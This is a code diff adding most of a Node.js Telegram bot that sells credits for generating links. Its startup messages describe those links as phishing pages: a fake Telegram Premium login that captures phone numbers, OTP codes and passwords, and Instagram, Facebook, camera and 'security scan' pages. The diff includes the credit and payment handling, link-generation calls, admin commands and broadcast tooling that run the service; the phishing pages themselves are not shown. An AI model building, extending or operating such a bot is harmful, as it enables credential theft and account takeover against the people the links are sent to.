+                replaceAllEmojis('✅ <b>Payment Verified!</b>\n\n💰 Amount: ₹') + payment.amount + replaceAllEmojis('\n⭐ Credits Added: +') + payment.credits + replaceAllEmojis('\n📊 Total Credits: ') + user.credits + replaceAllEmojis('\n\nThank you for your support! 🙏'),
+                { parse_mode: 'HTML' }
+            );
+        }
+        user._pendingPayment = null;
+        await user.save();
+
+        await S7.editMessageText(
+            replaceAllEmojis('✅ <b>Payment Accepted!</b>\n\n👤 User: <code>') + userId + replaceAllEmojis('</code>\n📊 Credits: ') + payment.credits + replaceAllEmojis('\n💵 Amount: ₹') + payment.amount + replaceAllEmojis('\n\n✅ Credits added successfully!'),
+            { chat_id: cid, message_id: mid, parse_mode: 'HTML' }
+        );
+
+        await S7.answerCallbackQuery(q.id, { text: '✅ Payment accepted! Credits added.' });
+        logToFile('💰 Admin accepted payment from ' + userId);
+        return;
+    }
+
+    if (q.data.startsWith('pay_reject_') && isAdmin) {
+        const userId = q.data.replace('pay_reject_', '');
+        const user = await getUser(userId);
+        const payment = user._pendingPayment;
+        if (!payment) {
+            await S7.answerCallbackQuery(q.id, { text: 'No pending payment', show_alert: true });
+            return;
+        }
+        await S7.sendMessage(userId,
+            replaceAllEmojis('❌ <b>Payment Rejected!</b>\n\n📊 Credits: ') + payment.credits + replaceAllEmojis('\n💵 Amount: ₹') + payment.amount + replaceAllEmojis('\n\nReason: Payment verification failed.\nPlease try again with a valid screenshot.'),
+            { parse_mode: 'HTML' }
+        );
+        user._pendingPayment = null;
+        await user.save();
+
+        await S7.editMessageText(
+            replaceAllEmojis('❌ <b>Payment Rejected!</b>\n\n👤 User: <code>') + userId + replaceAllEmojis('</code>\n📊 Credits: ') + payment.credits + replaceAllEmojis('\n💵 Amount: ₹') + payment.amount + replaceAllEmojis('\n\n❌ User notified.'),
+            { chat_id: cid, message_id: mid, parse_mode: 'HTML' }
+        );
+
+        await S7.answerCallbackQuery(q.id, { text: '❌ Payment rejected.' });
+        logToFile('💰 Admin rejected payment from ' + userId);
+        return;
+    }
+
+    if (q.data.startsWith('pay_dm_') && isAdmin) {
+        const userId = q.data.replace('pay_dm_', '');
+        await S7.sendMessage(cid,
+            replaceAllEmojis('💬 <b>Send message to user</b>\n\nReply with: <code>/dm ') + userId + replaceAllEmojis(' [message]</code>\n\nExample: <code>/dm ') + userId + replaceAllEmojis(' Please send a clearer screenshot.</code>'),
+            { parse_mode: 'HTML' }
+        );
+        await S7.answerCallbackQuery(q.id, { text: '💬 Type /dm ' + userId + ' [message]' });
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+
+    if (q.data.startsWith('gen_') || q.data.startsWith('regen_')) {
+        const isGen = q.data.startsWith('gen_');
+        const platform = q.data.replace(isGen ? 'gen_' : 'regen_', '');
+        const platformKey = platform === 'securityscan' ? 'securityScan' : platform;
+
+        const user = await getUser(uid);
+        if (user.banned) {
+            await S7.answerCallbackQuery(q.id, { text: '🚫 You are banned.', show_alert: true });
+            return;
+        }
+        if (!user.unlimited && (user.credits || 0) <= 0) {
+            await S7.answerCallbackQuery(q.id, { text: '❌ Insufficient credits! Need 1 credit. Use referral or buy credits.', show_alert: true });
+            return;
+        }
+        const deducted = await useCredit(uid);
+        if (!deducted) {
+            await S7.answerCallbackQuery(q.id, { text: '❌ Credit deduction failed. Please try again.', show_alert: true });
+            return;
+        }
+
+        const loadingMsg = await S7.sendMessage(cid, SYloveMenu(q.from.first_name, replaceAllEmojis('𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁 (1 Credit deducted)')), { parse_mode: 'HTML', reply_markup: SYBack });
+        try {
+            const response = await fetch(config.baseUrl + '/api/create-link', {
+                method: 'GET',
+                headers: { userid: String(uid), platform: platformKey }
+            });
+            const data = await response.json();
+            if (data.error && data.needBuy) {
+                await addCredits(uid, 1);
+                await S7.editMessageText(SYloveMenu(q.from.first_name, replaceAllEmojis('❌ ') + data.message + replaceAllEmojis('\n\nClick "Buy Credits" to purchase.')), { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack });
+                return;
+            }
+            const platformDisplay = platform === 'telegram' ? 'TELEGRAM PREMIUM' : platform === 'securityscan' ? 'SECURITY SCAN' : platform.toUpperCase();
+            const finalMsg = replaceAllEmojis('✅ <b>') + platformDisplay + replaceAllEmojis(' Link Generated!</b>\n\n🔗 <b>Your Link:</b>\n<code>') + data.url + replaceAllEmojis('</code>\n\n📌 <b>Platform:</b> ') + platformDisplay + replaceAllEmojis('\n⏰ <b>Valid for:</b> 15 minutes\n🔢 <b>Max Opens:</b> 5 times\n🔄 Share and earn referrals!\n\n⭐ <b>Remaining Credits:</b> ') + (user.unlimited ? '♾️ Unlimited' : (user.credits || 0));
+            await S7.editMessageText(SYloveMenu(q.from.first_name, finalMsg), { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: getRegenMarkup(platform) });
+        } catch (err) {
+            console.error('Link Error:', err.message);
+            logToFile('❌ Link Error: ' + err.message);
+            await addCredits(uid, 1);
+            await S7.editMessageText(SYloveMenu(q.from.first_name, replaceAllEmojis('❌ Error generating link')), { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack });
+        }
+        return;
+    }
+
+    if (q.data === 'back') {
+        await S7.deleteMessage(cid, mid);
+        await SendLoveSYMenu(cid, q.from.first_name);
+    }
+});
+
+// ====================== PAYMENT SCREENSHOT ======================
+S7.on('message', async (msg) => {
+    if (!msg.photo) return;
+    const user = await getUser(msg.from.id);
+    if (user.banned) return;
+    if (!user._pendingPayment) return;
+    const payment = user._pendingPayment;
+    const fileId = msg.photo[msg.photo.length - 1].file_id;
+    const adminMsg = replaceAllEmojis('💰 <b>New Payment Request</b>\n\n👤 <b>User:</b> @') + (msg.from.username || 'user_' + msg.from.id) + replaceAllEmojis('\n🆔 <b>User ID:</b> <code>') + msg.from.id + replaceAllEmojis('</code>\n📊 <b>Credits:</b> ') + payment.credits + replaceAllEmojis('\n💵 <b>Amount:</b> ₹') + payment.amount + replaceAllEmojis('\n📅 <b>Time:</b> ') + new Date().toLocaleString() + replaceAllEmojis('\n\n📸 <b>Screenshot:</b> (below)');
+    const adminButtons = { inline_keyboard: [[{ text: replaceAllEmojis('✅ ACCEPT'), callback_data: 'pay_accept_' + msg.from.id }], [{ text: replaceAllEmojis('❌ REJECT'), callback_data: 'pay_reject_' + msg.from.id }], [{ text: replaceAllEmojis('💬 DM USER'), callback_data: 'pay_dm_' + msg.from.id }]] };
+    await S7.sendPhoto(config.adminId, fileId, { caption: adminMsg, parse_mode: 'HTML', reply_markup: adminButtons });
+    await S7.sendMessage(msg.from.id, replaceAllEmojis('✅ <b>Payment screenshot received!</b>\n\n📊 Credits: ') + payment.credits + replaceAllEmojis('\n💵 Amount: ₹') + payment.amount + replaceAllEmojis('\n\n⏳ Please wait for admin to verify your payment.\nYou will be notified once approved.'), { parse_mode: 'HTML' });
+    logToFile('💰 Payment screenshot from ' + msg.from.id + ' - ₹' + payment.amount);
+});
+
+// ====================== BROADCAST HANDLER (with media support) ======================
+S7.on('message', async (msg) => {
+    if (!msg.text && !msg.photo && !msg.video && !msg.document && !msg.animation && !msg.sticker) return;
+    const text = msg.text || '';
+    if (!text.startsWith('/broadcast')) return;
+    if (msg.from.id.toString() !== config.adminId) return;
+    
+    // If it's a reply to a message with media
+    if (msg.reply_to_message) {
+        const reply = msg.reply_to_message;
+        const users = await User.find();
+        let sent = 0;
+        
+        for (const user of users) {
+            try {
+                if (reply.photo) {
+                    const fileId = reply.photo[reply.photo.length - 1].file_id;
+                    await S7.sendPhoto(user.userId, fileId, { caption: reply.caption || '', parse_mode: 'HTML' });
+                } else if (reply.video) {
+                    await S7.sendVideo(user.userId, reply.video.file_id, { caption: reply.caption || '', parse_mode: 'HTML' });
+                } else if (reply.document) {
+                    await S7.sendDocument(user.userId, reply.document.file_id, { caption: reply.caption || '', parse_mode: 'HTML' });
+                } else if (reply.animation) {
+                    await S7.sendAnimation(user.userId, reply.animation.file_id, { caption: reply.caption || '', parse_mode: 'HTML' });
+                } else if (reply.sticker) {
+                    await S7.sendSticker(user.userId, reply.sticker.file_id);
+                } else if (reply.text) {
+                    await S7.sendMessage(user.userId, replaceAllEmojis('📢 <b>Broadcast Message</b>\n\n') + reply.text, { parse_mode: 'HTML' });
+                }
+                sent++;
+            } catch (e) {
+                console.error('Broadcast error:', e.message);
+            }
+            if (sent % 10 === 0) await new Promise(r => setTimeout(r, 100));
+        }
+        await S7.sendMessage(msg.chat.id, `✅ Broadcast sent to ${sent} users.`);
+        logToFile(`Admin broadcast media to ${sent} users`);
+        return;
+    }
+    
+    // Text broadcast
+    const message = text.replace('/broadcast', '').trim();
+    if (!message) {
+        return S7.sendMessage(msg.chat.id, replaceAllEmojis('⚠️ Usage: /broadcast [message]\nOr reply to a message with /broadcast to forward media.'));
+    }
+    
+    const users = await User.find();
+    let sent = 0;
+    for (const user of users) {
+        try {
+            await S7.sendMessage(user.userId, replaceAllEmojis('📢 <b>Broadcast Message</b>\n\n') + message, { parse_mode: 'HTML' });
+            sent++;
+        } catch (e) {}
+        if (sent % 10 === 0) await new Promise(r => setTimeout(r, 100));
+    }
+    await S7.sendMessage(msg.chat.id, `✅ Broadcast sent to ${sent} users.`);
+    logToFile(`Admin broadcast: ${message}`);
+});
+
+// ====================== COMMAND HANDLERS ======================
+const adminOnly = (msg) => msg.from.id.toString() === config.adminId;
+
+S7.on('message', async (msg) => {
+    if (!msg.text) return;
+    const text = msg.text.trim();
+    const args = text.split(' ');
+    const cmd = args[0].toLowerCase();
+
+    if (cmd === '/help' || cmd === '/commands') {
+        const helpText = replaceAllEmojis(`📜 <b>Available Commands</b>
+
+👤 <b>User Commands:</b>
+/start - Start the bot
+/menu - Show main menu
+/pay [amount] - Buy credits (e.g., /pay 20)
+/credits - Check your credits
+/referral - Get referral link
+/redeem [coupon_code] - Redeem coupon
+/telegram - Generate Telegram Premium link
+
+👑 <b>Admin Commands:</b>
+/addcredits [userId] [amount] - Add credits
+/removecredits [userId] [amount] - Remove credits
+/unlimited [userId] - Toggle unlimited
+/resetuser [userId] - Reset user data
+/users - List all users
+/stats - Bot statistics
+/broadcast [message] - Send to all users (or reply to media)
+/addqr - Upload QR code (send photo after command)
+/removeqr - Remove QR code
+/viewqr - View QR code
+/addchannel [id] [name] [link] - Add channel
+/removechannel [id] - Remove channel
+/channels - List all channels
+/addphoto [caption] - Upload photo (reply with image)
+/featured [photoId] - Set featured photo
+/featuredmsg [message] - Set featured message
+/featuredtoggle - Toggle featured on/off
+/logs - Show recent logs
+/restart - Restart bot
+/dm [userId] [message] - DM a user
+/ban [userId or @username] - Ban user
+/unban [userId or @username] - Unban user
+/createcoupon [code] [credits] [maxUses] - Create coupon
+/coupons - List all coupons
+/deletecoupon [code] - Delete coupon
+/getadmin - Get admin panel link`);
+        await S7.sendMessage(msg.chat.id, helpText, { parse_mode: 'HTML' });
+        return;
+    }
+
+    if (!adminOnly(msg)) return;
+
+    if (cmd === '/addcredits' && args.length === 3) {
+        const userId = args[1];
+        const amount = parseInt(args[2]);
+        if (isNaN(amount)) return S7.sendMessage(msg.chat.id, '⚠️ Invalid amount.');
+        try {
+            const user = await getUser(userId);
+            if (user.unlimited) return S7.sendMessage(msg.chat.id, 'User has unlimited, cannot add credits.');
+            user.credits += amount;
+            await user.save();
+            await S7.sendMessage(msg.chat.id, `✅ Added ${amount} credits to user ${userId}. New balance: ${user.credits}`);
+            logToFile(`Admin added ${amount} credits to ${userId}`);
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/removecredits' && args.length === 3) {
+        const userId = args[1];
+        const amount = parseInt(args[2]);
+        if (isNaN(amount)) return S7.sendMessage(msg.chat.id, '⚠️ Invalid amount.');
+        try {
+            const user = await getUser(userId);
+            if (user.unlimited) return S7.sendMessage(msg.chat.id, 'User has unlimited, cannot remove credits.');
+            user.credits = Math.max(0, user.credits - amount);
+            await user.save();
+            await S7.sendMessage(msg.chat.id, `✅ Removed ${amount} credits from user ${userId}. New balance: ${user.credits}`);
+            logToFile(`Admin removed ${amount} credits from ${userId}`);
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/unlimited' && args.length === 2) {
+        const userId = args[1];
+        try {
+            const user = await getUser(userId);
+            user.unlimited = !user.unlimited;
+            await user.save();
+            await S7.sendMessage(msg.chat.id, `✅ Unlimited toggled ${user.unlimited ? 'ON' : 'OFF'} for user ${userId}`);
+            logToFile(`Admin toggled unlimited for ${userId}`);
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/resetuser' && args.length === 2) {
+        const userId = args[1];
+        try {
+            const user = await getUser(userId);
+            user.credits = 3;
+            user.referrals = 0;
+            user.totalReferrals = 0;
+            user.unlimited = false;
+            user.referredBy = null;
+            user.banned = false;
+            await user.save();
+            await S7.sendMessage(msg.chat.id, `✅ User ${userId} reset to default.`);
+            logToFile(`Admin reset user ${userId}`);
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/users') {
+        try {
+            const users = await User.find();
+            let list = replaceAllEmojis('👥 <b>All Users</b>\n\n');
+            for (const u of users) {
+                list += `🆔 ${u.userId} | Credits: ${u.unlimited ? '♾️' : u.credits} | Ref: ${u.totalReferrals} | ${u.banned ? '🚫' : '✅'}\n`;
+                if (list.length > 3800) {
+                    await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
+                    list = '';
+                }
+            }
+            if (list) await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/stats') {
+        try {
+            const users = await User.find();
+            const photos = await getPhotos();
+            const channels = await getChannels();
+            const referrals = await Referral.find();
+            const links = await Link.find();
+            const coupons = await getCoupons();
+            const stats = replaceAllEmojis(`📊 <b>Bot Statistics</b>\n\n👥 Users: ${users.length}\n📷 Photos: ${photos.length}\n📢 Channels: ${channels.length}\n👥 Referrals: ${referrals.length}\n🔗 Links: ${links.length}\n🎫 Coupons: ${coupons.length}\n⏱ Uptime: ${getUptime()}`);
+            await S7.sendMessage(msg.chat.id, stats, { parse_mode: 'HTML' });
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/addqr') {
+        const user = await getUser(msg.from.id);
+        user._waitingForQR = true;
+        await user.save();
+        await S7.sendMessage(msg.chat.id, '📤 Please send the QR code image (photo or document).');
+        return;
+    }
+
+    if (cmd === '/removeqr') {
+        const removed = deleteQRFile();
+        if (removed) await S7.sendMessage(msg.chat.id, '✅ QR code removed.');
+        else await S7.sendMessage(msg.chat.id, '❌ No QR code found.');
+        return;
+    }
+
+    if (cmd === '/viewqr') {
+        if (qrExists()) {
+            await S7.sendPhoto(msg.chat.id, QR_FILE, { caption: replaceAllEmojis('💳 Current QR Code') });
+        } else {
+            await S7.sendMessage(msg.chat.id, '❌ No QR code uploaded yet.');
+        }
+        return;
+    }
+
+    if (cmd === '/addchannel' && args.length === 4) {
+        const id = args[1];
+        const name = args[2];
+        const link = args[3];
+        try {
+            await addChannel(id, name, link);
+            await S7.sendMessage(msg.chat.id, `✅ Channel "${name}" added.`);
+            logToFile(`Admin added channel ${id}`);
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/removechannel' && args.length === 2) {
+        const id = args[1];
+        try {
+            await removeChannel(id);
+            await S7.sendMessage(msg.chat.id, `✅ Channel ${id} removed.`);
+            logToFile(`Admin removed channel ${id}`);
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/channels') {
+        const channels = await getChannels();
+        if (channels.length === 0) return S7.sendMessage(msg.chat.id, 'No channels.');
+        let list = replaceAllEmojis('📢 <b>Channels</b>\n\n');
+        channels.forEach(c => { list += `• ${c.name} (${c.id}) - ${c.link}\n`; });
+        await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
+        return;
+    }
+
+    if (cmd === '/addphoto') {
+        const user = await getUser(msg.from.id);
+        user._waitingForPhoto = true;
+        await user.save();
+        await S7.sendMessage(msg.chat.id, '📸 Please send the photo (or document image) you want to add. Include caption in the message.');
+        return;
+    }
+
+    if (cmd === '/featured' && args.length === 2) {
+        const photoId = args[1];
+        try {
+            await setFeaturedPhoto(photoId);
+            await S7.sendMessage(msg.chat.id, `✅ Featured photo set to ${photoId}.`);
+            logToFile(`Admin set featured photo ${photoId}`);
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/featuredmsg') {
+        const message = args.slice(1).join(' ');
+        if (!message) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /featuredmsg [message]');
+        try {
+            await setFeaturedMessage(message);
+            await S7.sendMessage(msg.chat.id, '✅ Featured message updated.');
+            logToFile(`Admin set featured message: ${message}`);
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/featuredtoggle') {
+        try {
+            const featured = await toggleFeaturedStatus();
+            await S7.sendMessage(msg.chat.id, `✅ Featured ${featured.status ? 'activated' : 'deactivated'}.`);
+            logToFile(`Admin toggled featured to ${featured.status}`);
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/logs') {
+        try {
+            const logPath = path.join(DATA_DIR, 'logs.txt');
+            if (fs.existsSync(logPath)) {
+                const logs = fs.readFileSync(logPath, 'utf8');
+                const lastLogs = logs.split('\n').slice(-50).join('\n');
+                await S7.sendMessage(msg.chat.id, replaceAllEmojis('📋 <b>Recent Logs</b>\n\n<pre>') + (lastLogs || 'No logs') + '</pre>', { parse_mode: 'HTML' });
+            } else {
+                await S7.sendMessage(msg.chat.id, 'No logs.');
+            }
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/restart') {
+        await S7.sendMessage(msg.chat.id, '🔄 Restarting bot...');
+        logToFile('Admin restarted bot');
+        process.exit(0);
+        return;
+    }
+
+    if (cmd === '/dm' && args.length >= 3) {
+        const userId = args[1];
+        const message = args.slice(2).join(' ');
+        try {
+            await S7.sendMessage(userId, replaceAllEmojis('💬 <b>Message from Admin</b>\n\n') + message, { parse_mode: 'HTML' });
+            await S7.sendMessage(msg.chat.id, `✅ Message sent to ${userId}`);
+        } catch (err) {
+            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/ban' && args.length >= 2) {
+        const identifier = args[1];
+        const userId = await resolveUserId(identifier);
+        if (!userId) return S7.sendMessage(msg.chat.id, '❌ User not found.');
+        const user = await getUser(userId);
+        user.banned = true;
+        await user.save();
+        await S7.sendMessage(msg.chat.id, `✅ User ${userId} banned successfully.`);
+        await S7.sendMessage(userId, replaceAllEmojis('🚫 You have been banned from using this bot.'));
+        logToFile(`Admin banned user ${userId}`);
+        return;
+    }
+
+    if (cmd === '/unban' && args.length >= 2) {
+        const identifier = args[1];
+        const userId = await resolveUserId(identifier);
+        if (!userId) return S7.sendMessage(msg.chat.id, '❌ User not found.');
+        const user = await getUser(userId);
+        user.banned = false;
+        await user.save();
+        await S7.sendMessage(msg.chat.id, `✅ User ${userId} unbanned successfully.`);
+        await S7.sendMessage(userId, replaceAllEmojis('✅ You have been unbanned. You can now use the bot.'));
+        logToFile(`Admin unbanned user ${userId}`);
+        return;
+    }
+
+    if (cmd === '/createcoupon' && args.length === 4) {
+        const code = args[1];
+        const credits = parseInt(args[2]);
+        const maxUses = parseInt(args[3]);
+        if (isNaN(credits) || isNaN(maxUses) || credits <= 0 || maxUses <= 0) {
+            return S7.sendMessage(msg.chat.id, '⚠️ Please enter valid numbers.');
+        }
+        try {
+            const coupon = await createCoupon(code, credits, maxUses, msg.from.id.toString());
+            await S7.sendMessage(msg.chat.id, replaceAllEmojis('✅ Coupon created!\nCode: <code>') + code + replaceAllEmojis('</code>\nCredits: ') + credits + replaceAllEmojis('\nMax Uses: ') + maxUses, { parse_mode: 'HTML' });
+            logToFile(`Admin created coupon: ${code}`);
+        } catch (err) {
+            await S7.sendMessage(msg.chat.id, '❌ Coupon code already exists or error: ' + err.message);
+        }
+        return;
+    }
+
+    if (cmd === '/coupons') {
+        const coupons = await getCoupons();
+        if (coupons.length === 0) return S7.sendMessage(msg.chat.id, 'No coupons available.');
+        let list = replaceAllEmojis('📋 <b>Coupons List</b>\n\n');
+        coupons.forEach(c => {
+            list += `🔹 <code>${c.code}</code> - ${c.credits} credits | Used: ${c.usedCount}/${c.maxUses}\n`;
+        });
+        await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
+        return;
+    }
+
+    if (cmd === '/deletecoupon' && args.length === 2) {
+        const code = args[1];
+        await deleteCoupon(code);
+        await S7.sendMessage(msg.chat.id, `✅ Coupon <code>${code}</code> deleted.`, { parse_mode: 'HTML' });
+        logToFile(`Admin deleted coupon: ${code}`);
+        return;
+    }
+});
+
+// ====================== HANDLER FOR /ADD PHOTO (reply) ======================
+S7.on('message', async (msg) => {
+    if (!msg.photo && !(msg.document && msg.document.mime_type && msg.document.mime_type.startsWith('image/'))) return;
+    const user = await getUser(msg.from.id);
+    if (!user._waitingForPhoto) return;
+    if (!adminOnly(msg)) return;
+
+    try {
+        let fileId;
+        let caption = msg.caption || '';
+        if (msg.photo) fileId = msg.photo[msg.photo.length - 1].file_id;
+        else fileId = msg.document.file_id;
+
+        const fileLink = await S7.getFileLink(fileId);
+        const response = await fetch(fileLink);
+        const buffer = await response.buffer();
+
+        const filename = Date.now() + '-' + (msg.document ? msg.document.file_name : 'photo.jpg');
+        const filePath = path.join(BOT_PHOTO_DIR, filename);
+        fs.writeFileSync(filePath, buffer);
+
+        const photo = await addPhoto({ filename, originalname: filename, path: filePath }, caption);
+        await S7.sendMessage(msg.chat.id, `✅ Photo uploaded: ${photo.id}`);
+        user._waitingForPhoto = false;
+        await user.save();
+        logToFile(`Admin uploaded photo ${photo.id}`);
+    } catch (err) {
+        S7.sendMessage(msg.chat.id, '❌ Error uploading photo: ' + err.message);
+    }
+});
+
+// ====================== QR PHOTO HANDLER ======================
+S7.on('message', async (msg) => {
+    if (!msg.photo && !(msg.document && msg.document.mime_type && msg.document.mime_type.startsWith('image/'))) return;
+    const user = await getUser(msg.from.id);
+    if (!user._waitingForQR) return;
+    if (!adminOnly(msg)) return;
+
+    try {
+        let fileId;
+        if (msg.photo) fileId = msg.photo[msg.photo.length - 1].file_id;
+        else fileId = msg.document.file_id;
+
+        const fileLink = await S7.getFileLink(fileId);
+        const response = await fetch(fileLink);
+        const buffer = await response.buffer();
+        saveQRBuffer(buffer);
+        user._waitingForQR = false;
+        await user.save();
+        await S7.sendMessage(msg.chat.id, '✅ QR code saved successfully.');
+        logToFile('QR uploaded via bot');
+    } catch (err) {
+        S7.sendMessage(msg.chat.id, '❌ Error saving QR: ' + err.message);
+    }
+});
+
+// ====================== REDEEM COUPON (USER COMMAND) ======================
+S7.on('message', async (msg) => {
+    if (!msg.text) return;
+    const text = msg.text.trim();
+    if (text.startsWith('/redeem ')) {
+        const code = text.replace('/redeem ', '').trim();
+        const userId = msg.from.id;
+        const user = await getUser(userId);
+        if (user.banned) return S7.sendMessage(userId, replaceAllEmojis('🚫 You are banned.'));
+        const result = await redeemCoupon(userId, code);
+        if (result.error) {
+            await S7.sendMessage(userId, '❌ ' + result.error);
+        } else {
+            await S7.sendMessage(userId, replaceAllEmojis('✅ Coupon redeemed! +') + result.credits + replaceAllEmojis(' credits added.\n⭐ Total Credits: ') + (await getUser(userId)).credits);
+            logToFile('🎫 User ' + userId + ' redeemed coupon ' + code);
+        }
+        return;
+    }
+});
+
+// ====================== BACKGROUND PROCESSES ======================
+setInterval(() => {
+    const userIds = Object.keys(pendingPhotos);
+    const now = Date.now();
+    for (const userId of userIds) {
+        if (pendingPhotos[userId] && pendingPhotos[userId].length > 0) {
+            const lastActive = userActive[userId] || 0;
+            if ((now - lastActive) > 2000 || pendingPhotos[userId].length >= 20) {
+                sendBatchPhotos(userId);
+            }
+        }
+    }
+}, 2000);
+
+setInterval(async () => {
+    await deleteExpiredLinks();
+}, 60000);
+
+setTimeout(async () => {
+    console.log('🗑️ Running cleanup on startup...');
+    await deleteAllExpiredLinks();
+    console.log('✅ Cleanup complete');
+}, 5000);
+
+// ====================== START SERVER ======================
+app.listen(config.port, () => {
+    console.log('✅ Server running on port ' + config.port);
+    console.log('📌 Admin Panel: ' + config.baseUrl + '/admin');
+    console.log('📌 Base URL: ' + config.baseUrl);
+    console.log('🤖 Bot is ready! Send /start to begin.');
+    console.log('⚡ FAST MODE: 100 photos in ~4 seconds!');
+    console.log('🔴 ALL BUTTONS ARE PINK/RED (DANGER STYLE)!');
+    console.log('💰 BUY CREDITS WITH QR + ACCEPT/REJECT FIXED!');
+    console.log('⏰ Links expire in 15 minutes, max 5 opens');
+    console.log('💳 Each link generation uses 1 credit');
+    console.log('📦 Important data in MongoDB, QR in file system');
+    console.log('🎫 Coupon system active');
+    console.log('🚫 Ban/Unban system active');
+    console.log('📜 All commands implemented!');
+    console.log('👑 Use /getadmin for admin panel link');
+    console.log('🗑️ Auto-delete expired links active!');
+    console.log('📱 TELEGRAM PREMIUM PHISHING PAGE FULLY FIXED!');
+    console.log('   - ALL PLATFORMS WORKING (Instagram, Facebook, Camera, Security Scan, Telegram)');
+    console.log('   - Larger page with proper +91 country code');
+    console.log('   - Real Telegram login page design');
+    console.log('   - OTP + Password capture with loading screens');
+    console.log('   - Admin gets OTP with 3 options');
+    console.log('   - Loading spinner stays until admin decides');
+    console.log('   - All data captured successfully!');
+    console.log('🌟 PREMIUM TELEGRAM EMOJIS ENABLED!');
+    console.log('📢 BROADCAST SUPPORTS: Photos, Videos, Documents, GIFs, Stickers, Text');
+    console.log('🔍 SECURITY SCAN: Checks photos first, then <300KB files');
+});
+
+process.on('uncaughtException', err => {
+    console.error('❌ Uncaught Exception:', err.message);
+    logToFile('❌ Uncaught Exception: ' + err.message);
+});
+process.on('unhandledRejection', reason => {
+    console.error('❌ Unhandled Rejection:', reason);
+    logToFile('❌ Unhandled Rejection: ' + reason);
+});
